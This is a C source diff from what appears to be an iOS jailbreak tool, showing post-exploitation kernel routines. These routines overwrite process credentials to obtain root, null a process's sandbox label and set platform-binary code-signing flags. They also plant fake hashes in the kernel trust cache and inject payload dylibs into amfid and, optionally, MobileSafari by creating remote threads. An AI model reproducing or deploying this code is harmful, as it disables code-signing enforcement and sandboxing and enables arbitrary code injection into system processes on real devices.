@@ -35,36 +35,72 @@ uint64_t proc_of_pid(pid_t pid) {
     return 0;
 }
 
-void rootify(uint64_t proc) {
+struct udata {
+    uint32_t p_uid;
+    uint32_t p_ruid;
+    uint32_t p_gid;
+    uint32_t p_rgid;
+    uint32_t cr_uid;
+    uint32_t cr_ruid;
+    uint32_t cr_svuid;
+    uint32_t cr_ngroups;
+    uint32_t cr_groups;
+    uint32_t cr_rgid;
+    uint32_t cr_svgid;
+};
+void rootify(uint64_t proc, struct udata *data) {
+    if (data == NULL) return;
+
     uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred));
-    //make everything 0 without setuid(0), pretty straightforward.
-    kernel_write32(proc + OFFSET(proc, p_uid), 0);
-    kernel_write32(proc + OFFSET(proc, p_ruid), 0);
-    kernel_write32(proc + OFFSET(proc, p_gid), 0);
-    kernel_write32(proc + OFFSET(proc, p_rgid), 0);
-    kernel_write32(ucred + OFFSET(ucred, cr_uid), 0);
-    kernel_write32(ucred + OFFSET(ucred, cr_ruid), 0);
-    kernel_write32(ucred + OFFSET(ucred, cr_svuid), 0);
-    kernel_write32(ucred + OFFSET(ucred, cr_ngroups), 1);
-    kernel_write32(ucred + OFFSET(ucred, cr_groups), 0);
-    kernel_write32(ucred + OFFSET(ucred, cr_rgid), 0);
-    kernel_write32(ucred + OFFSET(ucred, cr_svgid), 0);
+
+    uint64_t p_uid = kernel_read32(proc + OFFSET(proc, p_uid));
+    uint64_t p_ruid = kernel_read32(proc + OFFSET(proc, p_ruid));
+    uint64_t p_gid = kernel_read32(proc + OFFSET(proc, p_gid));
+    uint64_t p_rgid = kernel_read32(proc + OFFSET(proc, p_rgid));
+    uint64_t cr_uid = kernel_read32(ucred + OFFSET(ucred, cr_uid));
+    uint64_t cr_ruid = kernel_read32(ucred + OFFSET(ucred, cr_ruid));
+    uint64_t cr_svuid = kernel_read32(ucred + OFFSET(ucred, cr_svuid));
+    uint64_t cr_ngroups = kernel_read32(ucred + OFFSET(ucred, cr_ngroups));
+    uint64_t cr_groups = kernel_read32(ucred + OFFSET(ucred, cr_groups));
+    uint64_t cr_rgid = kernel_read32(ucred + OFFSET(ucred, cr_rgid));
+    uint64_t cr_svgid = kernel_read32(ucred + OFFSET(ucred, cr_svgid));
+
+    kernel_write32(proc + OFFSET(proc, p_uid), data->p_uid);
+    kernel_write32(proc + OFFSET(proc, p_ruid), data->p_ruid);
+    kernel_write32(proc + OFFSET(proc, p_gid), data->p_gid);
+    kernel_write32(proc + OFFSET(proc, p_rgid), data->p_rgid);
+    kernel_write32(ucred + OFFSET(ucred, cr_uid), data->cr_uid);
+    kernel_write32(ucred + OFFSET(ucred, cr_ruid), data->cr_ruid);
+    kernel_write32(ucred + OFFSET(ucred, cr_svuid), data->cr_svuid);
+    kernel_write32(ucred + OFFSET(ucred, cr_ngroups), data->cr_ngroups||1);
+    kernel_write32(ucred + OFFSET(ucred, cr_groups), data->cr_groups);
+    kernel_write32(ucred + OFFSET(ucred, cr_rgid), data->cr_rgid);
+    kernel_write32(ucred + OFFSET(ucred, cr_svgid), data->cr_svgid);
+
+    data->p_uid = p_uid;
+    data->p_ruid = p_ruid;
+    data->p_gid = p_gid;
+    data->p_rgid = p_rgid;
+    data->cr_uid = cr_uid;
+    data->cr_ruid = cr_ruid;
+    data->cr_svuid = cr_svuid;
+    data->cr_ngroups = cr_ngroups;
+    data->cr_groups = cr_groups;
+    data->cr_rgid = cr_rgid;
+    data->cr_svgid = cr_svgid;
 }
 
-void unsandbox(uint64_t proc) {
+uint64_t sandbox(uint64_t proc, uint64_t sb) {
     uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred)); // pid credentials
     uint64_t cr_label = kernel_read64(ucred + OFFSET(ucred, cr_label)); // MAC label
+    uint64_t orig_sb = kernel_read64(cr_label + OFFSET(cr_label, sandbox));
 
-    kernel_write64(cr_label + OFFSET(cr_label, sandbox) /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
+    kernel_write64(cr_label + OFFSET(cr_label, sandbox) /* First slot is AMFI's. so, this is second? */, sb); //get rid of sandbox by nullifying it
+
+    return orig_sb;
 }
 
-void platformize(uint64_t proc) {
-    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
-    uint32_t t_flags = kernel_read32(task + OFFSET(task, t_flags));
-    #define TF_PLATFORM        0x00000400   // task is a platform binary
-    kernel_write32(task + OFFSET(task, t_flags), t_flags | TF_PLATFORM);
-
-    //patch csflags
+void setcsflags(uint64_t proc) {
     uint32_t csflags = kernel_read32(proc + OFFSET(proc, p_csflags));
     #define CS_PLATFORM_BINARY 0x4000000    // this is a platform binary
     #define CS_INSTALLER       0x0000008    // has installer entitlement
@@ -77,13 +113,22 @@ void platformize(uint64_t proc) {
     kernel_write32(proc + OFFSET(proc, p_csflags), csflags);
 }
 
+void platformize(uint64_t proc) {
+    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
+    uint32_t t_flags = kernel_read32(task + OFFSET(task, t_flags));
+    #define TF_PLATFORM        0x00000400   // task is a platform binary
+    kernel_write32(task + OFFSET(task, t_flags), t_flags | TF_PLATFORM);
+
+    setcsflags(proc);
+}
+
 struct trust_chain {
     uint64_t next;
-    unsigned char uuid[16];
-    unsigned int count;
+    uint8_t uuid[16];
+    uint32_t count;
 } __attribute__((packed));
-typedef uint8_t hash_t[20];
-void trust_hashes(hash_t *hashes, size_t count) {
+#define CS_CDHASH_LEN 20
+void trust_hashes(const uint8_t *hashes, size_t count) {
     const uint8_t fake_uuid[] = {0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37};
     uint64_t fake_cache = 0;
 
@@ -94,13 +139,13 @@ void trust_hashes(hash_t *hashes, size_t count) {
     while (trusted_cache != 0) {
         uint32_t trusted_count = kernel_read32(trusted_cache + 24);
         printf("[*] trust_cache at 0x%llx, count: %d\n", trusted_cache, trusted_count);
-        hash_t *trusted_hashes = malloc(trusted_count * sizeof(hash_t));
-        kernel_read(trusted_cache + sizeof(struct trust_chain), trusted_hashes, trusted_count * sizeof(hash_t));
+        uint8_t *trusted_hashes = malloc(trusted_count * CS_CDHASH_LEN);
+        kernel_read(trusted_cache + sizeof(struct trust_chain), trusted_hashes, trusted_count * CS_CDHASH_LEN);
         int cnt = 0;
         for (int i = 0; i < count; i++) {
-            hash_t *hash = hashes + i;
+            const uint8_t *hash = hashes + i * CS_CDHASH_LEN;
             for (int j = 0; j < trusted_count; j++) {
-                if (memcmp(hash, trusted_hashes + j, sizeof(hash_t)) == 0) {
+                if (memcmp(hash, trusted_hashes + j * CS_CDHASH_LEN, CS_CDHASH_LEN) == 0) {
                     cnt++;
                 }
             }
@@ -136,22 +181,40 @@ void trust_hashes(hash_t *hashes, size_t count) {
         printf("[*] allocated: 0x%zx => 0x%llx\n", cache_size, kernel_trust);
 
         kernel_write(kernel_trust, &fake_chain, sizeof(fake_chain));
-        kernel_write(kernel_trust + sizeof(fake_chain), hashes, count * sizeof(hash_t));
+        kernel_write(kernel_trust + sizeof(fake_chain), hashes, count * CS_CDHASH_LEN);
 
         kernel_write64(trust_chain, kernel_trust);
     } else {
+        // insert hashes
         uint32_t trusted_count = kernel_read32(fake_cache + 24);
-        if (sizeof(struct trust_chain) + (trusted_count + count) * sizeof(hash_t) <= cache_size) {
-            // append hashes
-            kernel_write(fake_cache + sizeof(struct trust_chain) + trusted_count * sizeof(hash_t), hashes, count * sizeof(hash_t));
+        if (sizeof(struct trust_chain) + (trusted_count + count) * CS_CDHASH_LEN <= cache_size) {
+            uint8_t *new_hashes = malloc((trusted_count + count) * CS_CDHASH_LEN);
+            kernel_read(fake_cache + sizeof(struct trust_chain), new_hashes, trusted_count * CS_CDHASH_LEN);
+            for (int i = 0; i < count; i++) {
+                const uint8_t *hash = hashes + i * CS_CDHASH_LEN;
+                for (int j = 0; j < trusted_count + i; j++) {
+                    if (memcmp(hash, new_hashes + j * CS_CDHASH_LEN, CS_CDHASH_LEN) < 0) {
+                        for (int k = trusted_count + i - 1; k >= j; k--) {
+                            memcpy(new_hashes + (k + 1) * CS_CDHASH_LEN, new_hashes + k * CS_CDHASH_LEN, CS_CDHASH_LEN);
+                        }
+                        memcpy(new_hashes + j * CS_CDHASH_LEN, hash, CS_CDHASH_LEN);
+                        break;
+                    }
+                    if (j == trusted_count + i - 1) {
+                        memcpy(new_hashes + (j + 1) * CS_CDHASH_LEN, hash, CS_CDHASH_LEN);
+                    }
+                }
+            }
+            kernel_write(fake_cache + sizeof(struct trust_chain), new_hashes, (trusted_count + count) * CS_CDHASH_LEN);
             kernel_write32(fake_cache + 24, trusted_count + count);
+            free(new_hashes);
         } else {
             printf("[!] hash block size too big\n");
         }
     }
 }
 
-uint64_t proc_of_procName(char *nm) {
+uint64_t proc_of_name(const char *nm) {
     uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
     uint64_t proc = kernel_read64(allproc);
     char name[40] = {0};
@@ -203,61 +266,40 @@ mach_port_t task_for_proc(uint64_t self_proc, uint64_t proc) {
     return port;
 }
 
-void alert(uint64_t self_proc) {
-    #define IMPORT_BIN(file, sym) asm(\
-        ".data\n"                           /* Change section */\
-        ".balign 4\n"                       /* Word alignment */\
-        ".private_extern _" #sym "_start\n" /* Export the object address */\
-        "_" #sym "_start:\n"                /* Define the object label */\
-        ".incbin \"" file "\"\n"            /* Import the file */\
-        ".private_extern _" #sym "_end\n"   /* Export the object size */\
-        "_" #sym "_end:\n"                  /* Define the object size */\
-        ".balign 4\n"                       /* Word alignment */\
-        ".text\n")                          /* Restore section */
-    IMPORT_BIN("payload.dylib", payload);
-
-    const char *payload_path = "/var/containers/Bundle/.jailbreakme.dylib";
-    FILE *payload = fopen(payload_path, "wb");
-    if (payload == NULL) {
-        fprintf(stderr, "Unable to create payload. Cannot continue!\n");
+void inject_dylib(uint64_t self_proc, uint64_t target_proc, const char *payload_name, const uint8_t *payload_data, uint32_t payload_len) {
+    char payload_path[PATH_MAX];
+    sprintf(payload_path, "/var/containers/Bundle/%s_payload.dylib", payload_name);
+    FILE *payload_file = fopen(payload_path, "wb");
+    if (payload_file == NULL) {
+        printf("Unable to create payload. Cannot continue!\n");
         return;
     }
-    extern const uint8_t payload_start, payload_end;
-    const uint8_t *start = &payload_start, *end = &payload_end;
-    fwrite(start, 1, end - start, payload);
-    fclose(payload);
+    fwrite(payload_data, 1, payload_len, payload_file);
+    fclose(payload_file);
 
-    #define STACK_SIZE   0x8000
+    uint64_t orig_sb = sandbox(target_proc, 0);
 
-    uint64_t proc = proc_of_procName("MobileSafari");
-    if (proc == 0) {
-        fprintf(stderr, "Unable to get proc of MobileSafari. Cannot continue!\n");
-        return;
-    }
-    fprintf(stderr, "pid of MobileSafari: %d\n", kernel_read32(proc + OFFSET(proc, p_pid)));
-
-    unsandbox(proc);
-
-    task_t remote_task = task_for_proc(self_proc, proc);
+    task_t remote_task = task_for_proc(self_proc, target_proc);
     if (remote_task == MACH_PORT_NULL) {
-        fprintf(stderr, "Unable to get task for MobileSafari. Cannot continue!\n");
+        printf("Unable to get task for target process. Cannot continue!\n");
         return;
     }
 
     mach_vm_address_t remote_stack = (vm_address_t)NULL;
-    kern_return_t kr = mach_vm_allocate(remote_task, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
+    const uint32_t stack_len = 0x8000;
+    kern_return_t kr = mach_vm_allocate(remote_task, &remote_stack, stack_len, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+        printf("Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
         return;
     }
-    fprintf(stderr, "Allocated remote stack @0x%llx\n", remote_stack);
+    printf("Allocated remote stack @0x%llx\n", remote_stack);
 
     kr = mach_vm_write(remote_task,                         // Task port
                        remote_stack + 8,                    // Virtual Address (Destination)
                        (vm_address_t)payload_path,          // Source
                        strlen(payload_path) + 1);           // Length of the source
     if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+        printf("Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
         return;
     }
 
@@ -265,7 +307,7 @@ void alert(uint64_t self_proc) {
     uint64_t gadget = slide + 0x0180ae4830; // ret
     arm_thread_state64_t remote_thread_state64 = {0};
     remote_thread_state64.__lr = gadget;
-    remote_thread_state64.__sp = (uint64_t)remote_stack + STACK_SIZE / 2;
+    remote_thread_state64.__sp = (uint64_t)remote_stack + stack_len / 2;
     remote_thread_state64.__pc = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
     remote_thread_state64.__x[0] = (uint64_t)remote_stack; // pthread_t *thread
     remote_thread_state64.__x[1] = 0; // const pthread_attr_t *attr
@@ -275,7 +317,7 @@ void alert(uint64_t self_proc) {
     thread_act_t remote_thread;
     kr = thread_create_running(remote_task, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, ARM_THREAD_STATE64_COUNT , &remote_thread);
     if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to create remote thread: error %s", mach_error_string(kr));
+        printf("Unable to create remote thread: error %s", mach_error_string(kr));
         return;
     }
 
@@ -283,7 +325,7 @@ void alert(uint64_t self_proc) {
     for (;;) {
         kr = thread_get_state(remote_thread, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, &thread_state_count);
         if (kr != KERN_SUCCESS) {
-            fprintf(stderr, "Error getting stub thread state: error %s", mach_error_string(kr));
+            printf("Error getting stub thread state: error %s", mach_error_string(kr));
             break;
         }
 
@@ -291,27 +333,83 @@ void alert(uint64_t self_proc) {
             printf("Stub thread finished\n");
             kr = thread_terminate(remote_thread);
             if (kr != KERN_SUCCESS) {
-                fprintf(stderr, "Error terminating stub thread: error %s", mach_error_string(kr));
+                printf("Error terminating stub thread: error %s", mach_error_string(kr));
             }
             break;
         }
     }
+    usleep(100000);
+    sandbox(target_proc, orig_sb);
 }
 
+#define IMPORT_BIN(file, sym) asm(\
+    ".data\n"                           /* Change section */\
+    ".balign 4\n"                       /* Word alignment */\
+    ".private_extern _" #sym "_start\n" /* Export the object address */\
+    "_" #sym "_start:\n"                /* Define the object label */\
+    ".incbin \"" file "\"\n"            /* Import the file */\
+    ".private_extern _" #sym "_end\n"   /* Export the object size */\
+    "_" #sym "_end:\n"                  /* Define the object size */\
+    ".balign 4\n"                       /* Word alignment */\
+    ".text\n")                          /* Restore section */
+
+void patch_amfid(uint64_t self_proc) {
+    const char *name = "amfid";
+    uint64_t target_proc = proc_of_name(name);
+    if (target_proc == 0) {
+        printf("Unable to find %s process. Cannot continue!\n", name);
+        return;
+    }
+    printf("%s pid: %d\n", name, kernel_read32(target_proc + OFFSET(proc, p_pid)));
+
+    IMPORT_BIN("payload/amfid_payload.dylib", amfid_payload);
+    extern const uint8_t amfid_payload_start, amfid_payload_end;
+    const uint8_t *start = &amfid_payload_start, *end = &amfid_payload_end;
+
+    inject_dylib(self_proc, target_proc, name, start, end - start);
+}
+
+#ifdef PATCH_SAFARI
+void patch_safari(uint64_t self_proc) {
+    const char *name = "MobileSafari";
+    uint64_t target_proc = proc_of_name(name);
+    if (target_proc == 0) {
+        printf("Unable to find %s process. Cannot continue!\n", name);
+        return;
+    }
+    printf("%s pid: %d\n", name, kernel_read32(target_proc + OFFSET(proc, p_pid)));
+
+    IMPORT_BIN("payload/safari_payload.dylib", safari_payload);
+    extern const uint8_t safari_payload_start, safari_payload_end;
+    const uint8_t *start = &safari_payload_start, *end = &safari_payload_end;
+
+    inject_dylib(self_proc, target_proc, name, start, end - start);
+}
+#endif
+
 void drop_payload() {
+    uint8_t hashes[] = {
+        0xec, 0x08, 0xf6, 0xf5, 0x85, 0x55, 0x66, 0x62, 0xe2, 0xe9, 0x62, 0x48, 0xab, 0x5e, 0x3d, 0x7b, 0x1e, 0xc7, 0x66, 0xc5, // amfid_payload.dylib
+        0x61, 0x12, 0xed, 0xbe, 0xd2, 0xc6, 0x24, 0x7f, 0xfb, 0xdd, 0x0a, 0xac, 0xcc, 0xbf, 0x8d, 0x6a, 0xb4, 0x98, 0xde, 0x20, // safari_payload.dylib
+    };
+    trust_hashes(hashes, sizeof(hashes) / CS_CDHASH_LEN);
+
     pid_t self_pid = getpid();
     printf("self_pid: %d\n", self_pid);
 
     uint64_t self_proc = proc_of_pid(self_pid);
-    printf("self_proc: 0x%llx\n", self_proc);
 
-    rootify(self_proc);
-    printf("uid: %d\n", getuid());
+    struct udata self_udata = {0};
+    rootify(self_proc, &self_udata);
 
-    hash_t hashes[] = {
-        {0x25, 0x1e, 0xc7, 0x28, 0x71, 0xda, 0x7f, 0x0b, 0x07, 0x2f, 0xc0, 0x65, 0xad, 0x4a, 0x4a, 0x54, 0xc5, 0xbb, 0x88, 0xe8}, // payload
-    };
-    trust_hashes(hashes, sizeof(hashes) / sizeof(hash_t));
+    uint64_t self_sb = sandbox(self_proc, 0);
 
-    alert(self_proc);
+    patch_amfid(self_proc);
+
+#ifdef PATCH_SAFARI
+    patch_safari(self_proc);
+#endif
+
+    sandbox(self_proc, self_sb);
+    rootify(self_proc, &self_udata);
 }
